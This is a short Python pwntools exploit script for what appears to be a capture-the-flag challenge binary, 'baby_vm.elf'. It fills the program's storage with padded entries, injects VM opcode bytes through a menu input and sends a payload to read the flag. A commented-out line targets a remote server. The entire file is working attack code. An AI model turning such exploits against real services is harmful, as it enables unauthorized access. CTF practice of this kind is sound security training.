from pwn import *

def pad(s, padlen, pad='A'):
    assert len(s) <= padlen
    return s + pad * (padlen - len(s))


def choice(c):
    p.recvuntil('>>> ')
    p.sendline(str(c))

def add(content):
    choice(1)
    p.recvuntil(':')
    p.send(content)

def main():
    add(pad(p32(0x1) + p32(0x1), 0x40))
    for i in range(116):
        print(str(i))
        add(pad('', 0x40))

    # sysread [r0], r3
    # 28 30 ff
    p.recvuntil('>>> ')
    p.sendline('2\x28\x30')

    #time.sleep(.1)
    p.send('AAA\xffPleaseGiveMeTheFlag')
    p.interactive()


if __name__ == '__main__':
    try:
        p = process('./baby_vm.elf')
        #p = remote('46.101.255.206', 34999)
        main()
    except KeyboardInterrupt:
        p.interactive()
        raise
        
